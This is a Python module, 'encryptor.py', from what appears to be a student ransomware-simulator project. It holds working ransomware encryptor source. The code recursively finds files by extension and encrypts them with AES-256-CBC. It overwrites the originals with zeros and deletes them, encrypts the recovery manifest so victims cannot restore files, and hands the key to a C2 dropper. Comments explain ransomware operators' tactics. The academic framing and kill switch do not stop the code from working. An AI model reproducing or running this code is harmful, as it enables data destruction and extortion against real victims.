"""
encryptor.py — Production Encryptor Module
IT360 Project 14: Ransomware Simulator (Academic Use Only)

Upgrades from Phase 1 PoC:
  - Multi-file targeting by extension across a directory tree
  - Extension whitelist (never touch .exe, .dll, .sys etc.)
  - SHA-256 file manifest for integrity verification on decryption
  - Structured return value for C2 handoff (used by dropper.py)
  - Full kill-switch guard

Author : P1 — Malware Developer
Phase  : 2
"""

import os
import sys
import json
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding

# Import shared constants — single source of truth
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))
from src.common.config import (
    TARGET_EXTENSIONS,
    EXTENSION_BLACKLIST,
    LOCKED_EXTENSION,
    KILL_SWITCH_FILENAME,
    TARGET_DIRECTORY,
)


# ---------------------------------------------------------------------------
# KILL-SWITCH
# ---------------------------------------------------------------------------

def check_kill_switch() -> None:
    """
    Halt execution if the kill-switch flag file is present.

    Mirrors the WannaCry (2017) kill-switch domain concept.
    Must be the first call in any execution path.
    """
    if os.path.exists(KILL_SWITCH_FILENAME):
        print(f"[KILL SWITCH] '{KILL_SWITCH_FILENAME}' detected. Halting immediately.")
        print("[KILL SWITCH] No files were modified.")
        sys.exit(0)


# ---------------------------------------------------------------------------
# KEY GENERATION
# ---------------------------------------------------------------------------

def generate_key_iv() -> tuple[bytes, bytes]:
    """
    Generate a cryptographically random AES-256 key and 128-bit IV.

    Uses os.urandom() which reads from the OS CSPRNG. Never use
    Python's random module for cryptographic material.

    Returns:
        tuple[bytes, bytes]: (key, iv)
            key: 32 bytes — AES-256 session key.
            iv : 16 bytes — CBC initialization vector.
    """
    key: bytes = os.urandom(32)   # 256 bits
    iv: bytes  = os.urandom(16)   # 128 bits (AES block size)
    return key, iv


# ---------------------------------------------------------------------------
# FILE DISCOVERY
# ---------------------------------------------------------------------------

def discover_target_files(root_dir: str) -> list[str]:
    """
    Walk a directory tree and return paths of files matching TARGET_EXTENSIONS.

    Files with extensions in EXTENSION_BLACKLIST are skipped to avoid
    breaking the operating system — this mirrors real ransomware behavior
    (LockBit, REvil) that preserves OS functionality so the victim can
    read the ransom note and make payment.

    Already-encrypted files (.locked) are also skipped to prevent
    double-encryption corruption.

    Args:
        root_dir: Root directory path to begin the recursive walk.

    Returns:
        list[str]: Absolute paths of all files eligible for encryption.
    """
    targets: list[str] = []

    if not os.path.isdir(root_dir):
        print(f"[ERROR] Target directory not found: {root_dir}")
        return targets

    for dirpath, _, filenames in os.walk(root_dir):
        for filename in filenames:
            ext: str = os.path.splitext(filename)[1].lower()

            # Skip blacklisted extensions
            if ext in EXTENSION_BLACKLIST:
                print(f"[SKIP][BLACKLIST] {filename}")
                continue

            # Only encrypt targeted extensions
            if ext in TARGET_EXTENSIONS:
                targets.append(os.path.join(dirpath, filename))

    return targets


# ---------------------------------------------------------------------------
# MANIFEST (Integrity Verification)
# ---------------------------------------------------------------------------

def build_manifest(file_paths: list[str]) -> dict[str, str]:
    """
    Build a SHA-256 hash manifest of all plaintext files before encryption.

    The manifest maps each filepath to its pre-encryption SHA-256 hash.
    The decryptor uses this to verify that decryption restored files
    to their exact original state — byte for byte.

    This demonstrates that the simulator is designed for reliable, verified
    recovery — a concern real ransomware operators care about deeply, since
    victims won't pay if decryption is unreliable.

    Args:
        file_paths: List of file paths to hash.

    Returns:
        dict[str, str]: {filepath: sha256_hex_digest}
    """
    manifest: dict[str, str] = {}

    for filepath in file_paths:
        try:
            with open(filepath, "rb") as f:
                file_bytes: bytes = f.read()
            manifest[filepath] = hashlib.sha256(file_bytes).hexdigest()
        except (PermissionError, FileNotFoundError) as e:
            print(f"[WARN] Could not hash {filepath}: {e} — skipping.")

    return manifest


def save_manifest(manifest: dict[str, str], key: bytes, iv: bytes) -> str:
    """
    Encrypt and save the file manifest as '.manifest.enc'.

    The manifest is itself encrypted with the same AES session key so it
    cannot be used by the victim to identify or manually restore files.
    The decryptor receives the AES key from C2 and decrypts the manifest
    first, then uses it to verify post-decryption file integrity.

    Args:
        manifest : Dict of {original_filepath: sha256_hex}.
        key      : AES-256 session key.
        iv       : AES-CBC IV.

    Returns:
        str: Path to the saved encrypted manifest file.
    """
    manifest_path: str = ".manifest.enc"
    manifest_bytes: bytes = json.dumps(manifest).encode("utf-8")

    # Pad and encrypt the manifest JSON
    padder = sym_padding.PKCS7(algorithms.AES.block_size).padder()
    padded: bytes = padder.update(manifest_bytes) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    enc = cipher.encryptor()
    ciphertext: bytes = enc.update(padded) + enc.finalize()

    with open(manifest_path, "wb") as f:
        f.write(iv + ciphertext)   # Prepend IV for decryptor recovery

    print(f"[+] Manifest saved (encrypted): {manifest_path}")
    return manifest_path


# ---------------------------------------------------------------------------
# ENCRYPTION
# ---------------------------------------------------------------------------

def encrypt_file(filepath: str, key: bytes, iv: bytes) -> str:
    """
    Encrypt a single file with AES-256-CBC and rename it with .locked.

    Process:
      1. Read plaintext bytes.
      2. Apply PKCS7 padding to align to 128-bit block boundary.
      3. Encrypt with AES-256-CBC.
      4. Write IV + ciphertext to <original_name>.locked.
      5. Securely delete the original file.

    The IV is prepended to the ciphertext (not secret, but must be unique).
    The decryptor reads the first 16 bytes to recover the IV.

    Args:
        filepath : Path to the plaintext file.
        key      : 32-byte AES-256 session key.
        iv       : 16-byte CBC initialization vector.

    Returns:
        str: Path to the .locked output file.

    Raises:
        FileNotFoundError: If the file does not exist.
        PermissionError  : If the file cannot be read or written.
    """
    locked_path: str = filepath + LOCKED_EXTENSION

    try:
        with open(filepath, "rb") as f:
            plaintext: bytes = f.read()

        # PKCS7 pad to AES block boundary (128 bits = 16 bytes)
        padder = sym_padding.PKCS7(algorithms.AES.block_size).padder()
        padded_plaintext: bytes = padder.update(plaintext) + padder.finalize()

        # AES-256-CBC encryption
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        ciphertext: bytes = encryptor.update(padded_plaintext) + encryptor.finalize()

        # Write IV (16 bytes) + ciphertext to .locked file
        with open(locked_path, "wb") as f:
            f.write(iv + ciphertext)

        print(f"[+] Encrypted : {filepath} → {os.path.basename(locked_path)}")

    except FileNotFoundError:
        print(f"[ERROR] File not found: {filepath}")
        return ""
    except PermissionError:
        print(f"[ERROR] Permission denied: {filepath} — skipping.")
        return ""

    # Securely delete original after successful encryption
    _secure_delete(filepath)

    return locked_path


def _secure_delete(filepath: str) -> None:
    """
    Overwrite a file with zeros then delete it.

    Prevents plaintext recovery with forensic tools (Autopsy, Recuva).
    Single-pass zero-overwrite is sufficient for this academic context.

    Args:
        filepath: Path to the file to destroy.
    """
    try:
        size: int = os.path.getsize(filepath)
        with open(filepath, "r+b") as f:
            f.write(b"\x00" * size)
            f.flush()
            os.fsync(f.fileno())
        os.remove(filepath)
        print(f"[+] Secure-deleted: {filepath}")
    except (FileNotFoundError, PermissionError) as e:
        print(f"[WARN] Could not secure-delete {filepath}: {e}")


# ---------------------------------------------------------------------------
# MAIN ENCRYPTION ROUTINE
# ---------------------------------------------------------------------------

def run_encryption(target_dir: str) -> dict:
    """
    Execute the full encryption routine over a target directory.

    Orchestration order:
      1. Kill-switch check.
      2. Generate AES session key + IV.
      3. Discover target files.
      4. Build pre-encryption SHA-256 manifest.
      5. Encrypt all discovered files.
      6. Save encrypted manifest.

    Returns a payload dict ready for the dropper to hand to the C2 module:
      {
        "aes_key_hex": str,   ← handed to P2 for RSA-wrapping + exfiltration
        "iv_hex"     : str,
        "files_encrypted": int,
        "manifest_path"  : str
      }

    Args:
        target_dir: Root directory to encrypt.

    Returns:
        dict: Encryption result payload for the dropper.
    """
    check_kill_switch()

    print("\n[*] Generating AES-256 session key and IV...")
    key, iv = generate_key_iv()
    print(f"[*] AES Key (hex): {key.hex()}")
    print(f"[*] IV      (hex): {iv.hex()}")
    print("[!] In full build: key is RSA-wrapped and sent to C2 by dropper.py\n")

    print(f"[*] Discovering target files in: {target_dir}")
    targets: list[str] = discover_target_files(target_dir)
    print(f"[*] Files found: {len(targets)}\n")

    if not targets:
        print("[!] No target files found. Exiting.")
        sys.exit(0)

    print("[*] Building pre-encryption SHA-256 manifest...")
    manifest: dict[str, str] = build_manifest(targets)

    print("\n[*] Starting encryption loop...")
    encrypted_count: int = 0
    for filepath in targets:
        result = encrypt_file(filepath, key, iv)
        if result:
            encrypted_count += 1

    print(f"\n[✓] Encrypted {encrypted_count}/{len(targets)} files.")

    manifest_path: str = save_manifest(manifest, key, iv)

    # Return payload for dropper → C2 handoff
    return {
        "aes_key_hex"    : key.hex(),
        "iv_hex"         : iv.hex(),
        "files_encrypted": encrypted_count,
        "manifest_path"  : manifest_path,
    }


# ---------------------------------------------------------------------------
# ENTRY POINT
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    print("=" * 60)
    print("  IT360 — Ransomware Simulator | Encryptor v2 (P1)")
    print("  FOR ACADEMIC USE IN AIR-GAPPED VM ONLY")
    print("=" * 60)

    payload = run_encryption(TARGET_DIRECTORY)

    print("\n[✓] Encryption complete.")
    print(f"[✓] Files encrypted : {payload['files_encrypted']}")
    print(f"[✓] AES Key         : {payload['aes_key_hex']}")
    print("=" * 60)